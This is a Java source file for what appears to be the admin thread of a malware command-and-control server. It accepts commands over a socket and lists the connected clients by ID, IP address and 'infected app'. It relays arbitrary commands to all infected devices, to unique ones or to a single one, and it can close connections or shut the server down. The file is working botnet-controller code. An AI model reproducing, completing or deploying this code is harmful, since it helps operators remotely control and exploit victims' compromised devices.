import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.EOFException;
import java.io.IOException;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.ArrayList;

public class AdminThread implements Runnable {

    private Logger logger;
    private DataInputStream in = null;
    private Socket socket;

    public AdminThread(Socket socket) {
        this.socket = socket;
        logger = new Logger(Logger.LOG_TYPE_NORMAL, "admin_" + socket.getInetAddress());
    }

    @Override
    public void run() {
        try {
            in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
            try {
                // get header
                int header = in.readInt();
                // get size
                int size = in.readInt();
                if (header == Protocol.COMMAND) {
                    // here comes a command
                    byte[] command = new byte[size];
                    in.readFully(command, 0, command.length);
                    String strCommand = new String(command, "UTF-8");
                    logger.log(strCommand);
                    handleCommand(strCommand);
                }
            } finally {
                if (socket != null) {
                    socket.close();
                    socket = null;
                }
                if (in != null) {
                    in.close();
                }
                ConnectionHandler.adminThreads.remove(this);
            }
        } catch (SocketTimeoutException e) {
            logger.log("Connection timed out");
        } catch (EOFException e) {
            e.printStackTrace();
            logger.log("Did not get full command, try again");
        } catch (IOException e) {
            e.printStackTrace();
            logger.log(e.toString());
        }
    }

    private void handleCommand(String strCommand) throws IOException {
        if (strCommand.equalsIgnoreCase("list")) {
            if (ConnectionHandler.clientThreads.size() > 0) {
                for (int i = 0; i < ConnectionHandler.clientThreads.size(); i++) {
                    StringBuilder sb = new StringBuilder();
                    sb.append(i);
                    sb.append(": ");
                    sb.append(ConnectionHandler.clientThreads.get(i).getClientID());
                    sb.append(ConnectionHandler.clientThreads.get(i).getSocket().getInetAddress());
                    sb.append(" ");
                    sb.append(ConnectionHandler.clientThreads.get(i).getInfectedApp());
                    logger.log(sb.toString());
                }
            } else {
                logger.log("No connected devices");
            }
        } else if (strCommand.equalsIgnoreCase("unique")) {
            for (ClientThread thread : uniqueClients()) {
                logger.log(thread.getClientID());
            }
        } else if (strCommand.startsWith("all ")) {
            // targeting all connected clients
            for (ClientThread clientThread : ConnectionHandler.clientThreads) {
                clientThread.say(strCommand.substring(4, strCommand.length()));
            }
        } else if (strCommand.startsWith("unique ")) {
            // targeting all unique clientIds
            for (ClientThread clientThread : uniqueClients()) {
                clientThread.say(strCommand.substring(7, strCommand.length()));
            }
        } else if (strCommand.startsWith("close ")) {
            // close a specific clientNumber
            int clientNum = Integer.parseInt(strCommand.substring(6, strCommand.length()));
            ConnectionHandler.clientThreads.get(clientNum).getSocket().close();
        } else if (strCommand.equals("shutdown")) {
            System.exit(1);
        } else if (strCommand.equals("version")) {
            logger.log(Main.SERVER_VERSION);
        } else if (strCommand.equalsIgnoreCase("help") || strCommand.equalsIgnoreCase("?")) {
            usage();
        } else {
            // target a specific client
            try {
                int clientNum = -1;
                int firstSpace = -1;
                firstSpace = strCommand.indexOf(" ");
                if (firstSpace != -1) {
                    clientNum = Integer.parseInt(strCommand.substring(0, firstSpace));
                    if (clientNum > -1) {
                        if (clientNum < ConnectionHandler.clientThreads.size()) {
                            String command = strCommand.substring(firstSpace + 1, strCommand.length());
                            ConnectionHandler.clientThreads.get(clientNum).say(command);
                        } else {
                            logger.log("No such client: " + clientNum);
                        }
                    }
                } else {
                    logger.log("Sorry, didn't catch that");
                    usage();
                }
            } catch (NumberFormatException e) {
                logger.log("Sorry, didn't catch that");
                usage();
            }
        }
    }

    private static ArrayList<ClientThread> uniqueClients() {
        ArrayList<ClientThread> uniqueClients = new ArrayList<ClientThread>();
        ArrayList<String> clientIds = new ArrayList<String>();
        for (ClientThread thread : ConnectionHandler.clientThreads) {
            if (!clientIds.contains(thread.getClientID())) {
                uniqueClients.add(thread);
                clientIds.add(thread.getClientID());
            }
        }
        return uniqueClients;
    }

    private void usage() {
        String format = "%-22s %s"; // perfect console tabbing :)
        logger.log("usage:");
        logger.log(String.format(format, "'list'", "Lists all open connections"));
        logger.log(String.format(format, "'unique'", "Lists all unique devices"));
        logger.log(String.format(format, "'all [command]'", "Usage 'ALL [COMMAND]' sends the command to all connected devices"));
        logger.log(String.format(format, "'unique [command]'", "Usage 'UNIQUE [COMMAND]' sends the command to all unique devices"));
        logger.log(String.format(format, "'0,1,2... [command]'", "Usage '0 [COMMAND]' sends the command to client 0"));
        logger.log(String.format(format, "'# commands'", "Displays all the available commands of client #"));
        logger.log(String.format(format, "'close #'", "Usage 'CLOSE 0' closes connection at thread 0"));
        // logger.log(String.format(format, "'locations'", "Usage 'locations' logs known locations to location.log"));
        logger.log(String.format(format, "'shutdown'", "Shuts down the server"));
        logger.log(String.format(format, "'version'", "Prints the server version"));
        logger.log(String.format(format, "'help, ?'", "Displays this help"));
    }

}
